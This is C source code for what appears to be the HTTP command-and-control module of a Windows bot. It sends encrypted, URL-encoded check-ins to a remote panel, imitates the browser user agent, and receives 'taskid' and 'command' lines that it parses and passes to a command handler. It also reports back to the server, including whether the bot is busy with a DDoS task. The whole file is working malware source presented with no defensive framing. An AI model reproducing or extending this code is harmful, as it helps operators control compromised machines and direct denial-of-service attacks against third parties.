#include "../Includes/includes.h"

bool CopyToClipboard(const char *cData)
{
    bool bReturn = false;

    const size_t len = strlen(cData) + 1;

    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    if(hMem == NULL)
        return bReturn;

    memcpy(GlobalLock(hMem), cData, len);
    GlobalUnlock(hMem);

    if(!OpenClipboard(NULL))
        return bReturn;

    EmptyClipboard();
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();

    bReturn = TRUE;

    return bReturn;
}

#ifdef HTTP_BUILD

#define KEY_SIZE 53

void StringToUrlEncodedString(char *cSource, char *cOutput)
{
    char cUrlEncoded[strlen(cSource) * 3];
    memset(cUrlEncoded, 0, sizeof(cUrlEncoded));

    DWORD dwOffset = 0;

    for(unsigned int ui = 0; ui < strlen(cSource); ui++)
    {
        if(cSource[ui] == '=' || cSource[ui] == '+' || cSource[ui] == '/' || cSource[ui] == ' '|| cSource[ui] == '\n'|| cSource[ui] == '\r')
        {
            char cHex[4];
            memset(cHex, 0, sizeof(cHex));
            sprintf(cHex, "%%%X", (unsigned int)cSource[ui]);

            for(unsigned short us = 0; us < 3; us++)
                cUrlEncoded[ui + dwOffset + us] = cHex[us];

            dwOffset += 2;
        }
        else
            cUrlEncoded[ui + dwOffset] = cSource[ui];
    }

    strcpy(cOutput, cUrlEncoded);
}

void StringToStrongUrlEncodedString(char *cSource, char *cOutput)
{
    char cUrlEncoded[strlen(cSource) * 3];
    memset(cUrlEncoded, 0, sizeof(cUrlEncoded));

    for(unsigned int ui = 0; ui < strlen(cSource); ui++)
    {
        char cHex[4];
        memset(cHex, 0, sizeof(cHex));
        sprintf(cHex, "%%%X", (unsigned int)cSource[ui]);

        strcat(cUrlEncoded, cHex);
    }

    strcpy(cOutput, cUrlEncoded);
}

void GenerateMarker(char *cOutput, char *cOutputBase64)
{
    char cMarker[26];
    memset(cMarker, 0, sizeof(cMarker));

    for(unsigned short us = 0; us < 3; us++)
        strcat(cMarker, GenRandLCText());

    char cBase64[strlen(cMarker) * 3];
    memset(cBase64, 0, sizeof(cBase64));
    base64_encode((unsigned char*)cMarker, strlen(cMarker), cBase64, sizeof(cBase64));

    strcpy(cOutput, cMarker);
    strcpy(cOutputBase64, cBase64);
}

int GeneratestrtrKey(char *cOutputA, char *cOutputB)
{
    if(KEY_SIZE % 2 == 0)
        return 0;

    bool bSwitched = FALSE;

    char cKeyA[KEY_SIZE];
    memset(cKeyA, 0, sizeof(cKeyA));

    char cKeyB[KEY_SIZE];
    memset(cKeyB, 0, sizeof(cKeyB));

    while(true)
    {
        unsigned short us = GetRandNum(26) + 97;

        char cChar[2];
        memset(cChar, 0, sizeof(cChar));
        cChar[0] = (char)us;

        if(!bSwitched)
        {
            if(strstr(cKeyA, cChar))
                continue;
            else
                strcat(cKeyA, cChar);
        }
        else
        {
            if(!strstr(cKeyA, cChar) || strstr(cKeyB, cChar))
                continue;
            else
                strcat(cKeyB, cChar);
        }

        if((strlen(cKeyA) == (KEY_SIZE - 1) / 2) && !bSwitched)
            bSwitched = TRUE;
        else if(strlen(cKeyB) == (KEY_SIZE - 1) / 2)
            break;
    }

    int nCombinedLength = strlen(cKeyA) + strlen(cKeyB);

    strcpy(cOutputA, cKeyA);
    strcpy(cOutputB, cKeyB);

    return nCombinedLength;
}

void EncryptSentData(char *cSource, char *cOutputData, char *cOutputEncryptedKey, char *cOutputRawKeyA, char *cOutputRawKeyB)
{
    srand(GenerateRandomSeed());

    /*char cKeyA[KEY_SIZE];
    memset(cKeyA, 0, sizeof(cKeyA));
    char cKeyB[KEY_SIZE];
    memset(cKeyB, 0, sizeof(cKeyB));
    GeneratestrtrKey(cKeyA, cKeyB);

    char cKey[KEY_SIZE * 2];
    memset(cKey, 0, sizeof(cKey));
    sprintf(cKey, "%s:%s", cKeyA, cKeyB);

    char cKeyEncryptedA[strlen(cKey) * 3];
    memset(cKeyEncryptedA, 0, sizeof(cKeyEncryptedA));
    base64_encode((unsigned char*)cKey, strlen(cKey), cKeyEncryptedA, sizeof(cKeyEncryptedA));

    char cKeyEncryptedB[strlen(cKeyEncryptedA) * 3];
    memset(cKeyEncryptedB, 0, sizeof(cKeyEncryptedB));
    StringToStrongUrlEncodedString(cKeyEncryptedA, cKeyEncryptedB);

    char cEncryptedA[strlen(cSource) * 3];
    memset(cEncryptedA, 0, sizeof(cEncryptedA));
    base64_encode((unsigned char*)cSource, strlen(cSource), cEncryptedA, sizeof(cEncryptedA));

    char cEncryptedB[strlen(cEncryptedA)];
    memset(cEncryptedB, 0, sizeof(cEncryptedB));
    strcpy(cEncryptedB, cEncryptedA);
    strtr(cEncryptedB, cKeyA, cKeyB);

    strcpy(cOutputData, cEncryptedB);
    strcpy(cOutputEncryptedKey, cKeyEncryptedB);
    strcpy(cOutputRawKeyA, cKeyA);
    strcpy(cOutputRawKeyB, cKeyB);*/

    char cKeyA[KEY_SIZE];
    memset(cKeyA, 0, sizeof(cKeyA));
    char cKeyB[KEY_SIZE];
    memset(cKeyB, 0, sizeof(cKeyB));
    GeneratestrtrKey(cKeyA, cKeyB);

    char cKey[KEY_SIZE * 2];
    memset(cKey, 0, sizeof(cKey));
    sprintf(cKey, "%s:%s", cKeyA, cKeyB);

    char cKeyEncrypted[strlen(cKey) * 3];
    memset(cKeyEncrypted, 0, sizeof(cKeyEncrypted));
    StringToStrongUrlEncodedString(cKey, cKeyEncrypted);

    char cEncrypted[strlen(cSource)];
    memset(cEncrypted, 0, sizeof(cEncrypted));
    strcpy(cEncrypted, cSource);
    strtr(cEncrypted, cKeyA, cKeyB);

    strcpy(cOutputData, cEncrypted);
    strcpy(cOutputEncryptedKey, cKeyEncrypted);
    strcpy(cOutputRawKeyA, cKeyA);
    strcpy(cOutputRawKeyB, cKeyB);

#ifdef DEBUG
    printf("----------------------\nEncryption Communication Details:\nKey: %s\nKey StrongUrlEncoded: %s\nData Encrypted(strtr): %s\n", cKey, cKeyEncrypted, cEncrypted);
#endif
}

void DecryptReceivedData(char *cSource, char *cKeyA, char *cKeyB, char *cOutputData)
{
    char cDecryptedA[strlen(cSource)];
    memset(cDecryptedA, 0, sizeof(cDecryptedA));
    strcpy(cDecryptedA, cSource);
    strtr(cDecryptedA, cKeyB, cKeyA);

    char cDecryptedB[strlen(cDecryptedA)];
    memset(cDecryptedB, 0, sizeof(cDecryptedB));
    base64_decode(cDecryptedA, cDecryptedB, sizeof(cDecryptedB));

    strcpy(cOutputData, cDecryptedB);
}

bool SendPanelRequest(SOCKADDR_IN httpreq, char *cHttpHost, char *cHttpPath, unsigned short usHttpPort, char *cHttpData)
{
    bool bReturn = FALSE;

    char cEncryptedData[MAX_HTTP_PACKET_LENGTH];
    memset(cEncryptedData, 0, sizeof(cEncryptedData));
    char cEncryptedKey[MAX_HTTP_PACKET_LENGTH];
    memset(cEncryptedKey, 0, sizeof(cEncryptedKey));
    char cKeyA[KEY_SIZE];
    memset(cKeyA, 0, sizeof(cKeyA));
    char cKeyB[KEY_SIZE];
    memset(cKeyB, 0, sizeof(cKeyB));
    EncryptSentData(cHttpData, cEncryptedData, cEncryptedKey, cKeyA, cKeyB);

    char cOutPacket[MAX_HTTP_PACKET_LENGTH];
    memset(cOutPacket, 0, sizeof(cOutPacket));

    strcpy(cOutPacket, "POST /");
    strcat(cOutPacket, cHttpPath);
    strcat(cOutPacket, " HTTP/1.1");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Host: ");
    strcat(cOutPacket, cHttpHost);
    strcat(cOutPacket, ":");
    char cHttpPort[7];
    memset(cHttpPort, 0, sizeof(cHttpPort));
    itoa(usHttpPort, cHttpPort, 10);
    strcat(cOutPacket, cHttpPort);
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Connection: close");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Content-Type: application/x-www-form-urlencoded");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Cache-Control: no-cache");
    strcat(cOutPacket, cReturnNewline);

    if(dwOperatingSystem > WINDOWS_XP)
    {
        char cObtainedUserAgentString[MAX_HTTP_PACKET_LENGTH];
        memset(cObtainedUserAgentString, 0, sizeof(cObtainedUserAgentString));
        DWORD dwUserAgentLength;
        if(fncObtainUserAgentString(0, cObtainedUserAgentString, &dwUserAgentLength) == NOERROR)
        {
            strcat(cOutPacket, "User-Agent: ");
            strcat(cOutPacket, cObtainedUserAgentString);
            strcat(cOutPacket, cReturnNewline);
        }
    }

    char cFinalOutData[strlen(cEncryptedData) * 3];
    memset(cFinalOutData, 0, sizeof(cFinalOutData));
    StringToStrongUrlEncodedString(cEncryptedData, cFinalOutData);

    char cFinalOutKey[strlen(cEncryptedKey) * 3];
    memset(cFinalOutKey, 0, sizeof(cFinalOutKey));
    StringToStrongUrlEncodedString(cEncryptedKey, cFinalOutKey);

    //char cCopy[DEFAULT];
    //memset(cCopy, 0, sizeof(cCopy));
    //sprintf(cCopy, "%s:%s", cEncryptedData, cEncryptedKey);
    //CopyToClipboard(cCopy);

    char cMarker[26];
    memset(cMarker, 0, sizeof(cMarker));
    char cMarkerBase64[sizeof(cMarker) * 3];
    memset(cMarkerBase64, 0, sizeof(cMarkerBase64));
    GenerateMarker(cMarker, cMarkerBase64);

    char cUrlEncodedMarker[strlen(cMarker) * 3];
    memset(cUrlEncodedMarker, 0, sizeof(cUrlEncodedMarker));
    StringToStrongUrlEncodedString(cMarker, cUrlEncodedMarker);

    strcat(cOutPacket, "Content-Length: ");
    char cHttpContentLength[25];
    memset(cHttpContentLength, 0, sizeof(cHttpContentLength));
    int nPacketDataLength = 2 + strlen(cFinalOutKey) + 3 + strlen(cFinalOutData) + 3 + strlen(cUrlEncodedMarker);
    itoa(nPacketDataLength, cHttpContentLength, 10);
    strcat(cOutPacket, cHttpContentLength);
    strcat(cOutPacket, cReturnNewline);
    strcat(cOutPacket, cReturnNewline);

    char cPacketData[nPacketDataLength];
    memset(cPacketData, 0, sizeof(cPacketData));
    strcpy(cPacketData, "a=");
    strcat(cPacketData, cFinalOutKey);
    strcat(cPacketData, "&b=");
    strcat(cPacketData, cFinalOutData);
    strcat(cPacketData, "&c=");
    strcat(cPacketData, cUrlEncodedMarker);

    strcat(cOutPacket, cPacketData);
//CopyToClipboard(cPacketData);

#ifdef DEBUG
    printf("----------------------\nOutgoing Packet(%i bytes):\n%s\n", strlen(cOutPacket), cOutPacket);
    printf("-----------\nDecrypted Contents(%i bytes): %s\n", strlen(cHttpData), cHttpData);
#endif

    char cInPacket[MAX_HTTP_PACKET_LENGTH];
    memset(cInPacket, 0, sizeof(cInPacket));

    char cParsePacket[MAX_HTTP_PACKET_LENGTH];
    memset(cParsePacket, 0, sizeof(cParsePacket));

    SOCKET sSock = NULL;
    do
        sSock = fncsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    while(sSock == INVALID_SOCKET);

    if(fncconnect(sSock, (PSOCKADDR)&httpreq, sizeof(httpreq)) != SOCKET_ERROR)
    {
        int nBytesSent = fncsend(sSock, cOutPacket, strlen(cOutPacket), NULL);
        if(nBytesSent != SOCKET_ERROR)
        {
#ifdef DEBUG
            printf("----------------------\nPacket successfully sent!(%i bytes)\n", nBytesSent);
#endif
            int nReceivedData = fncrecv(sSock, cInPacket, sizeof(cInPacket), NULL);

            strcpy(cParsePacket, cInPacket);

            if(nReceivedData < 1 && strlen(cParsePacket) < 1)
            {
#ifdef DEBUG
                printf("----------------------\nAn error occured! No server response...\n-----------\n");
#endif

                fncclosesocket(sSock);
                return FALSE;
            }
            else
            {
#ifdef DEBUG
                printf("----------------------\nIncoming Packet(%i bytes):\n%s\n-----------\n", strlen(cParsePacket), cParsePacket);
#endif
            }
        }
        else
        {
#ifdef DEBUG
            printf("-----------\nFailed to send packet to server\n");
#endif

            strcpy(cParsePacket, "ERR_FAILED_TO_SEND");
        }
    }
    else
    {
#ifdef DEBUG
        printf("-----------\nFailed to connect to server\n");
#endif

        strcpy(cParsePacket, "ERR_FAILED_TO_CONNECT");
    }
    fncclosesocket(sSock);

    char *cBreakLine = strtok(cParsePacket, "\n");
    if(!IsValidHttpResponse(cBreakLine))
        return bReturn;
    else
        bReturn = TRUE;

#ifdef DEBUG
    printf("Decrypted Contents:\n");
#endif

    //if(!strstr(cInPacket, cMarkerBase64))
    if(!strstr(cInPacket, cMarker))
    {
#ifdef DEBUG
        printf("NONE![No Marker]\n");
#endif
        return FALSE;
    }

    //char *cMessageBundle = strstr(cInPacket, cMarkerBase64) + strlen(cMarkerBase64);
    char *cMessageBundle = strstr(cInPacket, cMarker) + strlen(cMarker);

    if(cMessageBundle == NULL || strstr(cInPacket, "Content-Length: 0"))
    {
#ifdef DEBUG
        printf("NONE![Content-Length: 0]\n");
#endif
        return FALSE;
    }
    else if(strstr(cMessageBundle, "Location:"))
    {
#ifdef DEBUG
        printf("NONE![LocationReturn]\n");
#endif
        bHttpRestart = TRUE;
        return FALSE;
    }

    char cDecryptedMessageBundle[MAX_HTTP_PACKET_LENGTH];
    memset(cDecryptedMessageBundle, 0, sizeof(cDecryptedMessageBundle));
    DecryptReceivedData(cMessageBundle, cKeyA, cKeyB, cDecryptedMessageBundle);

    cMessageBundle = strtok(cDecryptedMessageBundle, "\n");
    while(cMessageBundle != NULL)
    {
        ParseHttpLine(cMessageBundle);

        if(bHttpRestart)
            break;

        cMessageBundle = strtok(NULL, "\n");
    }

    return bReturn;
}

bool ParseHttpLine(char *cMessage)
{
    char cDecrypted[MAX_HTTP_PACKET_LENGTH];
    memset(cDecrypted, 0, sizeof(cDecrypted));
    base64_decode(cMessage, cDecrypted, sizeof(cDecrypted));
    //strcpy(cDecrypted, cMessage);

#ifdef DEBUG
    printf("%s\n", cDecrypted);
#endif

    char cRawMessage[MAX_HTTP_PACKET_LENGTH];
    memset(cRawMessage, 0, sizeof(cRawMessage));
    strcpy(cRawMessage, cDecrypted);

    char cParseLine[MAX_HTTP_PACKET_LENGTH];
    memset(cParseLine, 0, sizeof(cParseLine));

    if(strstr(cRawMessage, "interval"))
    {
        memcpy(cParseLine, cRawMessage + 10, strlen(cRawMessage) - 10 - 1);

        if(atoi(cParseLine) < 5)
            nCheckInInterval = 5;
        else
            nCheckInInterval = atoi(cParseLine);
    }
    else if(strstr(cRawMessage, "taskid") && strstr(cRawMessage, "command"))
    {
        unsigned short usCommandOffsetForTaskId = 0;

        unsigned short usLocationInMessageOffset = strlen(cRawMessage) - strlen(strstr(cRawMessage, "command"));
        memcpy(cParseLine, cRawMessage + usLocationInMessageOffset + 8, strlen(cRawMessage) - usLocationInMessageOffset - 8 - 1);
        if(cParseLine[0] == '!')
        {
            usCommandOffsetForTaskId = strlen(cParseLine);
            memcpy(cParseLine, cParseLine + 1, strlen(cParseLine)); //cParseLine == THE COMMAND
        }

        char cTaskId[10];
        memset(cTaskId, 0, sizeof(cTaskId));
        memcpy(cTaskId, cRawMessage + 8, strlen(cRawMessage) - 8 - usCommandOffsetForTaskId - 2);

        int nTaskId = atoi(cTaskId); //nTaskId == THE TASK ID
        nCurrentTaskId = nTaskId;

        char cFinalCommand[DEFAULT];
        memset(cFinalCommand, 0, sizeof(cFinalCommand));
        strcpy(cFinalCommand, cParseLine);
        ParseCommand(cFinalCommand);
    }
    else if(strstr(cRawMessage, "ERROR_NOT_IN_DB"))
    {
#ifdef DEBUG
        printf("-----------\nError: Not in database! Restarting panel communication protocol...\n");
#endif
        bHttpRestart = TRUE;
    }
}

bool IsValidHttpResponse(char *cHttpResponse)
{
    bool bReturn = FALSE;

    if(strstr(cHttpResponse, "200 OK"))
        bReturn = TRUE;

    return bReturn;
}

bool SendHttpCommandResponse(int nTaskId, char *cReturnParameter)
{
    bool bReturn = FALSE;

    char cDataToServer[MAX_HTTP_PACKET_LENGTH];
    memset(cDataToServer, 0, sizeof(cDataToServer));

    char cBusy[7];
    memset(cBusy, 0, sizeof(cBusy));
    if(bDdosBusy)
        strcpy(cBusy, "true");
    else
        strcpy(cBusy, "false");

    sprintf(cDataToServer, "|type:response|uid:%s|taskid:%i|return:%s|busy:%s|", cUuid, nTaskId, cReturnParameter, cBusy);

    if(SendPanelRequest(httpreq, cHttpHostGlobal, cHttpPathGlobal, usPort, cDataToServer))
        bReturn = TRUE;

    return bReturn;
}
#endif
